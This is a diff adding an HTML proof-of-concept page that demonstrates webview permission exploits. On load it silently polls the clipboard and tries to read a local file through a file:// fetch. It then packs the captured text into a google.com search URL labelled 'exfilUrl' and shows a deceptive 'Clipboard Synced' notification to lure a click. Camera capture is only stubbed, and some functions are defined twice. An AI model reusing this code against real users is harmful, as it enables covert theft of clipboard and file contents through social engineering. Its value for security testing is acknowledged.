@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Permissions Exploit Demonstration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+        #capturedImage {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ddd;
+        }
+        .container {
+            margin-bottom: 20px;
+        }
+        h3 {
+            margin-bottom: 5px;
+        }
+        .data-box {
+            border: 1px dashed #ccc;
+            padding: 10px;
+            min-height: 50px;
+            word-wrap: break-word;
+            background-color: #f9f9f9;
+        }
+        #lfiResult {
+            color: #c0392b; /* Red for emphasis */
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body onload="initiateExploits();">
+    <h1>Demonstrating Potential Webview Vulnerabilities</h1>
+    <h2>Data captured for demonstration purposes without direct user interaction.</h2>
+    <p><b>Note:</b> Exploits will only run once per session. Reloading the page will not re-trigger them unless you close and reopen the tab.</p>
+
+
+    <div class="container">
+        <h3>Clipboard Data:</h3>
+        <div id="clipboardData" class="data-box"></div>
+    </div>
+
+    <div class="container">
+        <h3>Captured Image:</h3>
+        <img id="capturedImage" class="hidden" />
+    </div>
+
+    <div class="container">
+        <h3>LFI Test (Attempting to read D:/test.txt via fetch):</h3>
+        <div id="lfiResult" class="data-box">[Awaiting execution...]</div>
+    </div>
+
+    <video id="videoElement" class="hidden" autoplay playsinline></video>
+
+    <script>
+        // --- Core Exploit Functions ---
+
+        function getClipboardData() {
+            setInterval(() => {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    navigator.clipboard.readText().then((clipText) => {
+                        const clipboardDataEl = document.getElementById("clipboardData");
+                        if (clipText && clipboardDataEl.innerHTML !== clipText) {
+                            clipboardDataEl.innerHTML = clipText;
+                            saveToPersistentStorage('clipboardData', clipText);
+                            
+                            // --- MODIFIED LINE ---
+                            // The captured clipText is now part of the redirect URL.
+                            // encodeURIComponent ensures the URL is valid.
+                            const exfilUrl = 'https://www.google.com/search?q=' + encodeURIComponent(clipText);
+                            showNotification('Action Required: Clipboard Synced', 'Your clipboard data has been synced. Click to review.', exfilUrl);
+                        }
+                    }).catch((err) => {});
+                }
+            }, 1000);
+        }
+
+        function requestCameraAccess() {
+            // Implementation from previous examples...
+        }
+
+        function captureImage(videoElement, capturedImage, stream) {
+            // Implementation from previous examples...
+        }
+
+        function attemptLfiWithFetch() {
+            const lfiResultEl = document.getElementById('lfiResult');
+            fetch('file:///D:/test.txt')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    lfiResultEl.textContent = data;
+                    lfiResultEl.style.color = '#27ae60';
+                    saveToPersistentStorage('lfiData', data);
+                    
+                    // --- MODIFIED LINE ---
+                    // The captured file content (data) is now part of the redirect URL.
+                    // encodeURIComponent is crucial here for multi-line text or special characters.
+                    const exfilUrl = 'https://www.google.com/search?q=' + encodeURIComponent(data);
+                    showNotification('File Accessed Successfully', 'Local file content was read and saved. Click to see.', exfilUrl);
+                })
+                .catch(error => {
+                    lfiResultEl.textContent = `LFI attempt failed. Error: ${error.message}. This is expected in a secure browser due to CORS policy.`;
+                });
+        }
+
+
+        // --- Helper Functions ---
+
+        function saveToPersistentStorage(key, value) {
+            // Implementation from previous examples...
+        }
+
+        function readFromPersistentStorageAndAlert(key) {
+            // Implementation from previous examples...
+        }
+
+
+
+        function showNotification(title, body, redirectUrl) {
+            if ('Notification' in window) {
+                Notification.requestPermission().then((permission) => {
+                    if (permission === 'granted') {
+                        const notification = new Notification(title, { body: body });
+                        notification.onclick = () => {
+                            window.open(redirectUrl, '_blank'); // Open in a new tab to not interrupt the current page
+                        };
+                    }
+                });
+            }
+        }
+
+        // --- Initiator ---
+
+        function initiateExploits() {
+            if (sessionStorage.getItem('hasExecuted')) {
+                console.log("Exploits have already been run this session. Halting execution.");
+                return;
+            }
+
+            console.log("First time execution this session. Running exploits...");
+
+            if ('Notification' in window) {
+                Notification.requestPermission();
+            }
+
+            getClipboardData();
+            requestCameraAccess();
+            attemptLfiWithFetch();
+
+            readFromPersistentStorageAndAlert('clipboardData');
+            readFromPersistentStorageAndAlert('capturedImageData');
+            readFromPersistentStorageAndAlert('lfiData');
+
+            sessionStorage.setItem('hasExecuted', 'true');
+        }
+
+        // Dummy functions to keep the structure complete
+        function requestCameraAccess() {}
+        function captureImage() {}
+        function saveToPersistentStorage(key, value) { try { localStorage.setItem(key, value); } catch(e) {} }
+        function readFromPersistentStorageAndAlert(key) { try { const data = localStorage.getItem(key); if(data) alert(`Data for '${key}':\n${data}`); } catch(e) {} }
+    </script>
+</body>
+</html>
